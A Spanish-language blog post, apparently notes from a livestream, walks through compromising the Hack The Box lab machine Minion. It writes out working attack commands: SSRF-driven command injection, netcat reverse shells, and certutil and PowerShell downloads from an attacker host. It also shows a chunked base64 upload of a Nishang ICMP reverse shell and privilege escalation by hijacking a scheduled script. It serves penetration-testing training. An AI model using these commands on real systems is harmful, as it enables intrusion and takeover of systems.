---
layout: post
title: HTB_Minion
date: 2023/07/10
slug: HTB_Minion
heroImage: /assets/machines.jpg
---

# Minion {-}

## Introduccion {-}

La maquina del dia 03/08/2021 se llama Minion
.

El replay del live se puede ver aqui

[![S4vitaar Minion maquina](https://img.youtube.com/vi/l0mCUUHATr4/0.jpg)](https://www.youtube.com/watch?v=l0mCUUHATr4)

No olvideis dejar un like al video y un comentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.57
```
ttl: 127 -> maquina Windows. 
Recuerda que en cuanto a ttl respecta 64 = linux y 128 = windows. 
Pero como estamos en hackthebox hay un nodo intermediario que hace que el ttl disminuya una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.57 
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.57 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p62696 10.10.10.57 -oN targeted
```

| Puerto | Servicio   | Que se nos occure? | Que falta? |
| ------ | ---------- | ------------------ | ---------- |
| 62696  | http - IIS | Web, fuzzing, .asp |            |


### Analizando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.57:62696
```

Nada muy interesante

#### http-enum {-}

Lanzamos un web scan con nmap.

```bash
nmap --script http-enum -p62696 10.10.10.57 -oN webScan
```

No nos detecta nada

#### Chequear la web por puerto 62696 {-}

Con firefox navegamos en la web para ver lo que es.

La pagina esta under construction y poco mas.


#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.57:62696/FUZZ
```

Encontramos un ruta 
```bash
 /backend 
```
 pero no se ve nada en firefox. Decidimos fuzzear con la extension 
```bash
 .asp 
```


```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.57:62696/FUZZ.asp
```

Aqui encontramos un fichero 
```bash
 test.asp 
```
 y navigando no dice que no encuentra el parametro 
```bash
 u 
```
 que tendria que ser un URL.
Intentamos ver si se conecta a nuestro servidor web

1. Creamos un servidor web

    ```bash
    python3 -m http.server 80
    ```

1. Intentamos conectar por la web 

    ```bash
    http://10.10.10.57:62696/test.asp?u=http://10.10.14.8
    http://10.10.10.57:62696/test.asp?u=http://10.10.14.8/test
    ```

Aqui no pasa nada. La idea aqui, como solo tiene un puerto abierto seria de explorar si tiene puerto privados usando localhost

```bash
http://10.10.10.57:62696/test.asp?u=http://localhost
```

Aqui ya vemos que el puerto 80 interno de la maquina esta abierto. Decidimos descubrir los puertos abiertos de la maquina con WFUZZ


### Descubrimiento de los puertos abiertos con WFUZZ {-}

Wfuzz permite hacer rangos de numeros con el parametro 
```bash
 -z 
```


```bash
wfuzz -c -t 200 --hc=404 -z range,1-65535 http://10.10.10.57:62696/test.asp?u=http://localhost:FUZZ
```

Como nunca va a existir un codigo de estado 404, (porque el recurso existe), wfuzz no va a reportar como validas todas
las requests. Hay que lanzar una vez y occultar las palabra que son de 89

```bash
wfuzz -c -t 200 --hc=404 --hw=89 -z range,1-65535 http://10.10.10.57:62696/test.asp?u=http://localhost:FUZZ
```

Aqui vemos que solo el puerto 80 esta abierto.



Esto funciona. Pero no vemos en la web el output del comando. Solo vemos el codigo de estado (0 si el comando a funcionado, 1 si no a funcionado)

## Evaluacion de vulnerabilidades {-}

### Analizamos la web interna por el puerto privado 80 {-}

Aqui se puede ver un panel de administrador donde parece que podamos ejecutar comandos a nivel de sistema. Si pinchamos el link
no nos va a dejar porque nos lleva a una url interna 
```bash
 127.0.0.1/cmd.aspx 
```
. Pero si la introducimos directamente en 

```bash
http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx
```

functiona.

Si le lanzamos un whoami, nos redirige en una url un poco turbia. Analizando el codigo fuente vemos que la peticion es get con el
nombre xcmd.

```bash
http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=whoami
```

### Controlamos si tenemos conectividad con la maquina de atacante {-}

1. Nos ponemos en escucha por trasa ICMP

    ```bash
    tcpdump -i tun0 icmp -n
    ```

1. en la web

    ```bash
    http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=ping 10.10.14.8
    ```

Como es una maquina windows, tenemos que recivir 4 pings y es el caso. Tenemos conectividad con la maquina victima.

## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Entablar una reverse shell {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Preparamos un nc.exe para la maquina victima

    ```bash
    locate nc.exe
    cp /usr/share/sqlninja/apps/nc.exe ./content
    ```

1. Nos creamos un registro compartido a nivel de red

    ```bash
    cd content
    impacket-smbserver smbFolder $(pwd) -smb2support
    ```

1. En la web

    ```bash
    http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=\\10.10.14.8\smbFolder\nc.exe -e cmd 10.10.14.8 443
    ```

En este caso no responde y vemos un exit status 1. Intentamos de varias maneras

1. Nos creamos un registro compartido a nivel de red

    ```bash
    impacket-smbserver smbFolder $(pwd) -smb2support -username s4vitar -password s4vitar123
    ```

```bash
http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=net use x: \\10.10.14.8\smbFolder /user:s4vitar s4vitar123
```

No responde y vemos un exit status 2.

Intentamos con un servidor web.

1. Nos creamos un servidor web

    ```bash
    python3 -m http.server 80
    ```

```bash
http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=certutil.exe -f -urlcache -split http://10.10.14.8/nc.exe nc.exe
http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=powershell iwr -uri http://10.10.14.8/nc.exe -OutFile test
```

No responde y vemos un exit status que no es 0.

Aqui vemos que las conexiones por TCP no funcionan. Puede ser porque hay reglas definidas que no permiten utilizar TCP y S4vitar
nos adelanta que tampoco funccionna por UDP.

Aqui hemos podido comprobar que:

- tenemos capacidad de ejecucion remota de commando.
- tenemos conectividad por trasa ICMP
- el protocolo TCP esta bloqueado
- el protocole UDP esta bloqueado

Segun esta analisis intentamos crearnos una reverse shell por **ICMP**

### Entablar una reverse shell por ICMP {-}

1. Nos descargamos el Nishang

    ```bash
    git clone https://github.com/samratashok/nishang
    cd nishang
    cd Shells
    cp Invoke-PowerShellIcmp.ps1 ../../icmp.ps1
    cd ../..
    vi icmp.ps1
    ```

Aqui como tenemos que pasar por la url de la web para enviarnos el fichero, tenemos que preparar el fichero.

1. Ejecucion de comandos prealables en nuestra maquina

    ```bash
    sysctl -w net.ipv4.icmp_echo_ignore_all=1
    wget https://raw.githubusercontent.com/bdamele/icmpsh/master/icmpsh_m.py
    ```

1. Añadimos el invoke al final del fichero

    ```bash
    Invoke-PowerShellIcmp -IPAddress 10.10.14.8
    ```

1. Borramos todo los comentarios que hay en el fichero
1. Borramos todo los saltos de linea

    ```bash
    cat icmp.ps1 | sed '/^\s*$/d' > icmp
    rm icmp.ps1
    mv icmp icmp.ps1
    ```

1. Utilizamos una powershell

    ```bash
    pwsh
    ```

1. Codificamos el fichero en base64

    ```bash
    $fileContent = Get-Content -Raw ./icmp.ps1
    $fileContent
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($fileContent)
    $encode = [Convert]::ToBase64String($bytes)
    $encode | Out-File icmp.ps1.b64
    ```

1. En una shell linux normal modificamos los symbolos 
```bash
 + 
```
 y 
```bash
 = 
```
 para encodearlos en urlencode

    ```bash
    php --interactive
    print urlencode("+");
    %2B
    print urlencode("=");
    %3D
    ```

1. Modificamos todos los symbolos 
```bash
 + 
```
 por **%2B** y los symbolos 
```bash
 = 
```
 por **%3D**
1. Spliteamos el fichero en dimensiones de lineas iguales

    ```bash
    fold icmp.ps1.b64 > icmp
    ```

1. Nos creamos un script para automatizar el envio de cada linea del fichero

    ```bash
    #!/bin/bash

    function ctrl_c(){
        echo -e "\n\n[!] Saliendo...\n"
        exit 1
    }
    
    # Ctrl+C
    trap ctrl_c INT

    for line in $(cat icmp.ps1.b64); do
        command="echo ${line} >> C:\Temp\reverse.ps1"
        curl -s -v -X GET "http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx" --data-urlencode "xcmd=$command"
    done
    ```

1. Lanzamos el Script

    ```bash
    ./fileUpload.sh
    ```

1. Controlamos en la web si el fichero existe

    ```bash
    http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=type C:\Temp\reverse.ps1
    ```

    Vemos el status code a 0

1. Decodificamos desde la web el fichero que esta en base64
    
    - las etapas serian estas

        ```bash
        $file = Get-Content C:\Temp\reverse.ps1 
        $decode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($file))
        $decode > C:\Temp\pwned.ps1
        ```

    - y en la url de la web seria:

        ```bash
        http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=powershell $file = Get-Content C:\Temp\reverse.ps1; $decode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($file)); $decode > C:\Temp\pwned.ps1
        ```

1. Lanzamos el script python previamente descargado

    ```bash
    rlwrap python icmpsh_m.py 10.10.14.8 10.10.10.57
    ```

1. Ejecutamos el pwned.ps1 desde la web

    ```bash
    http://10.10.10.57:62696/test.asp?u=http://localhost/cmd.aspx?xcmd=powershell C:\Temp\pwned.ps1
    ```

Por fin estamos adentro de la maquina ;)

## Escalada de Privilegios {-}

### Rootear la maquina {-}

```bash
whoami /priv
#Output

SEImpersonatePrivilege
```

Aqui ya vemos que podemos escalar privilegios con 
```bash
 JuicyPotatoe.exe 
```
 o 
```bash
 RotenPotatoe.exe 
```
 pero S4vitar nos
muestra aqui una via alternativa de escalar privilegios en esta maquina.

#### Secuestro de comandos para copiar los ficheros del usuario decoder.MINION {-}

```bash
dir c:\
dir c:\sysadmscripts
```

Vemos en 
```bash
 C:\ 
```
 un directorio raro llamado 
```bash
 sysadmscript 
```
. En este directorio, hay dos ficheros:

- c.ps1
- del_logs.bat

Analizando con el comando type lo que hacen estos script, vemos que el 
```bash
 del_logs.bat 
```
 llama al fichero 
```bash
 c.ps1 
```
 y lo
ejecuta con **powershell**. Aqui pensamos que hay una tarea que se ejecuta a intervalo regular de tiempo que ejecuta el fichero

```bash
 del_logs.bat 
```
. Miramos si podemos modificar los ficheros.

```bash
cacls c:\sysadmscripts\del_logs.bat
cacls c:\sysadmscripts\c.ps1
```

Modificamos el Script para copiar los ficheros del usuario **decoder.Minion**

Aqui vemos que solo podemos modificar el fichero 
```bash
 c.ps1 
```


```bash
echo "dir C:\Users\decoder.MINION\Desktop\ > C:\Temp\decoder_desktop.txt" > C:\Temp\c.ps1
echo "copy C:\Users\decoder.MINION\Desktop\user.txt > C:\Temp\decoder_user.txt" >> C:\Temp\c.ps1
echo "copy C:\Users\decoder.MINION\Desktop\* > C:\Temp\" >> C:\Temp\c.ps1
copy C:\Temp\c.ps1 C:\sysadmscripts\c.ps1
```

Esperando un poco, nos copia los ficheros en 
```bash
 c:\temp 
```
. Podemos visualizar la flag del usuario.
Tambien vemos un fichero 
```bash
 backup.zip 
```
 y si le chequeamos por **Aditionnal Data Streams** con el comando

#### Lectura de Additionnal Data Strems y crackeo de Hash {-}

```bash
Get-Item -Path C:\Temp\backup.zip -stream *
```

Vemos que tiene un stream llamado pass. Lo miramos con el comando 
```bash
 type 
```


```bash
type C:\Temp\backup.zip:pass
```

y encontramos un hash. Si lo pasamos por [crackstation](https://crackstation.net/) nos da la contraseña.

#### Ejecucion de comandos como administrator con ScriptBlock {-}

Aqui el problema es que no tenemos conectividad con **smb** o otros puertos para conectarnos como root. La idea
aqui seria de ejecutar comandos como administrator para cambiar la reglas del Firewall.

```bash
$user = 'minion\administrator'; $pw = '1234test'; $secpw = ConvertTo-SecureString $pw - AsPlainText -Force; $cred = New-Object \
System.Management.Automation.PSCredential $user, $secpw; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {whoami}

#Output
minion\administrator
```

Aqui vemos que podemos ejecutar comando como el usuario administrator. Vamos a por el cambio en el firewall

```bash
$user = 'minion\administrator'; $pw = '1234test'; $secpw = ConvertTo-SecureString $pw - AsPlainText -Force; $cred = New-Object \
System.Management.Automation.PSCredential $user, $secpw; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock \
{New-NetFirewallRule -DisplayName setenso -RemoteAddress 10.10.14.8 -Direction inbound -Action Allow}

#Output
minion\administrator
```

Si ahora desde la maquina de atacante le hacemos un nmap para ver los puertos abiertos

```bash
nmap -sS --min-rate 5000 --open -vvv -n -Pn -p- 10.10.10.57
```

vemos que tenemos todo expuesto y como hay el puerto 3389 que es el puerto **RDP** ya nos podemos conectar con Remmina por ejemplo.


![miio-remia](/assets/images/minion-remina.png) 
Y ya estamos en la maquina como administrator

```{r, echo = FALSE, fig.cap="minion remmina pwned", out.width="90%"}
knitr::include_graphics("images/minion-pwned.png")
